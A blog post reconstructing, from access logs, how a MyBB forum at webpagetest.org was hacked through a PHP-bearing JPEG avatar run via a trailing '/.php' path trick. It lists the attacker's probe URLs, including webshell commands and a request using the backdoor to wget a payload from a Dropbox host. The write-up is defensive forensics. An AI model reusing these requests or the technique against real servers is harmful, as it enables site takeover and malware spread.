---
title: "Anatomy of a MyBB Forum Hack"
date: 2012-04-03T15:14:00.000-04:00
originalUrl: https://blog.patrickmeenan.com/2012/04/anatomy-of-mybb-forum-hack.html
---

It has been an exciting 2 days.  Yesterday I discovered that over the weekend the forums at webpagetest.org had been hacked and that someone had installed a back door.  I traced the source of the entry pretty quickly and locked out the exploit he had used but I wanted to make sure he hadn't done anything more damaging while he was there so I spent the last day pouring over the access logs to trace back his activities.  
  
The hack involved uploading a custom image file that was both a valid jpeg and had php code inside of it that the php interpreter would execute and then tricking the server into executing the image as if it were php. I have the actual image as well as the command and control php he installed if anyone is interested (and by anyone I mean anyone I know who will do _good_ things with it).  
  
I thought it would be valuable to share (and somewhat entertaining) what I gleaned from the logs so here is the timeline of activities that I managed to piece together (all times are GMT):  
  

## March 23, 2012 

\- Registered for account in the WebPagetest forums and uploaded executable profile pic  
\- [http://www.webpagetest.org/forums/member.php?action=profile&uid=27069](http://www.webpagetest.org/forums/member.php?action=profile&uid=27069)  
\- used (presumably throw-away) yahoo mail account: science\_media017@yahoo.com  
\- from 49.248.26.133 (also logged in to the account from 178.239.51.81 but there has been no recent activity from that IP)  
  
  

## March 30, 2012

### 109.123.117.122 (probably automated bot/process)

**08:48** - Back door is installed and first accessed (install method is highlighted later).  Hidden IFrame is added to the forums page.  
  
**Periodically** - main page is loaded (presumably to check the status of the IFrame)  
  
  

### 49.248.26.133 (appears to be manual activity)

**08:58** - Loads the main page (presumably checking the IFrame)  
  
  

## April 1, 2012

### 109.123.117.122

**08:49** - Installs adobe.jar (unfortunately I deleted it and didn't keep a copy for analysis), presumably for distribution or more access (no Java on the server though so not much point)  

### 49.248.26.133

**09:16** - Accessed the installed adobe.jar (presumably testing to make sure it installed)  
  
  

## April 2, 2012

### me

**~14:00** - Observed unexpected requests loading and found the IFrame (and quickly deleted it)  
**17:58** - Tracked down the location of the code that was used to install the IFrame (and unfortunately deleted it in my panic)  
**18:16** - Secured the hole that was used to execute php in the uploads directory  
  
  

## April 3, 2012

### 49.248.26.133

**05:54** - Checked the main page for the iframe  
**06:02** - attempted to access gs.php (the back door php code)  

### 69.22.185.30 (manual debugging/activity)

**06:03** - Started probing to see what broke - attempted to access:  
  
/forums/uploads/avatars/system1.php  
/forums/uploads/avatars/avatar\_27069.jpg/avatar\_27069.php?c=ls  
/forums/uploads/avatars/avatar\_27069.jpg/avatar\_27069.php  
/forums/uploads/avatars/avatar\_27069.jpg/.php  
**06:04** - Manually browser the forums, presumably checking to see if everything was down or just his hack and did some more probing:  
  
/forums/images/on.gif  
/forums/images/on.gif/.php to see if the php interpreter hole was still open (was at the time but he couldn't get any code placed there to execute - this has since been closed)  
/forums/uploads/avatars/tileeeee.html (404 - already cleaned up)  
  
**06:05** - Tried the avatar hack again:  
/forums/uploads/avatars/avatar\_27069.jpg  
/forums/uploads/avatars/avatar\_27069.jpg/avatar\_27069.php?c=ls  
/forums/uploads/avatars/avatar\_27069.jpg/avatar\_27069.php  
/forums/uploads/avatars/avatar\_27069.jpg/.php  
/forums/uploads/avatars/avatar\_27069.jpg/  
**06:06** - Tries other avatar files to see if php hack is blocked on uploads  
/forums/uploads/avatars/avatar\_1.jpg/.php (yep - 403)  
**06:07** - Tries other back door commands he had installed:  
/forums/uploads/avatars/sys.php  
/forums/uploads/avatars/check.php  
/forums/uploads/avatars/save.php  
/forums/uploads/avatars/  
**06:10** - More frustration:  
/forums/uploads/avatars/gs.php   
/forums/uploads/avatars/system1.php  
/forums/uploads/avatars/avatar\_27069.jpg  
/forums/uploads/avatars/avatar\_27069.jpg/.php??1=system&2=ls  
/forums/uploads/avatars/avatar\_27069.jpg/.php  
**06:14** - Went through the registration UI and actually registered to the forum again  
f309017@rppkn.com (throw-away)  
[http://www.webpagetest.org/forums/member.php?action=profile&uid=27633](http://www.webpagetest.org/forums/member.php?action=profile&uid=27633)  
**06:21** - Activated his registration  

### 209.73.132.37 (switched to another IP to continue manual debugging/activity)

  
**06:29** - Accesses forum using new registration (normal forum browsing, a couple of failed post attempts)  
**06:31** - Tries to access the admin control panel /forums/admincp (404)  
**06:35** - Logs out of the forum  
**06:38** - Tries manually loading various attachments with different attempts to obfuscate the path  
**06:42** - Tries (unsuccessfully) php execution for attachments /forums/attachment.php?aid=175/.php  
**06:44** - Tries the old avatar routine again /forums/uploads/avatars/avatar\_9.jpg/.php  
**06:48** - Attempts various probings to see if any other extensions will potentially execute:  
/forums/uploads/avatars/avatar\_9.jpg?/.s   
/forums/uploads/avatars/avatar\_9.jpg/.s   
/forums/uploads/avatars/avatar\_9.jpg?/.hoohl  
/forums/uploads/avatars/avatar\_9.jpg?/.txt  
/forums/uploads/avatars/avatar\_9.jpg?/.jsp  
/forums/uploads/avatars/avatar\_9.jpg/.jsp  
/forums/uploads/avatars/avatar\_9.jpg/.pdf  
/forums/uploads/avatars/avatar\_9.jpg/.bin  
/forums/uploads/avatars/avatar\_9.jpg/.yahoo  
/forums/uploads/avatars/avatar\_9.jpg/.fucked  
/forums/uploads/avatars/avatar\_9.jpg/.:(   
/forums/uploads/avatars/avatar\_9.jpg/.p%20hp  
/forums/uploads/avatars/avatar\_9.jpg/.avatar\_9.p%20hp  
**06:50** - Tries some of the old files again for some reason:  
/forums/uploads/avatars/sys.php   
/forums/uploads/avatars/system1.php?dir=%2Fvar%2Fwww%2Fwebpagetest.org%2Fforums%2Fuploads%2Favatars%2Fcsheck.php  
**06:52** - Tries to use the avatar hack to download his payload again  
/forums/uploads/avatars/avatar\_27069.jpg/avatar\_27069.php?c=wget%20http://dl.dropbox.com/u/xxxxxxx/gs.php  
**06:54** - More futile attempts to probe the avatars directory and understand why things aren't working:  
/forums/uploads/avatars/upper.php  
/forums/uploads/avatars/php  
/forums/uploads/avatars/.php (ding, if he didn't know by now, nothing with .php anywhere inside of uploads will load)  
**06:55** - Seriously, he is expecting different results?  
/forums/uploads/avatars/system1.php?dir=%2Fvar%2Fwww%2Fwebpagetest.org%2Fforums%2F  
**06:56** - He does some MORE poking around to see if the trailing .php hack is universally blocked (it is now)  
/forums/images/smilies/tongue.gif/.php  
**07:00** - Last trace of access for today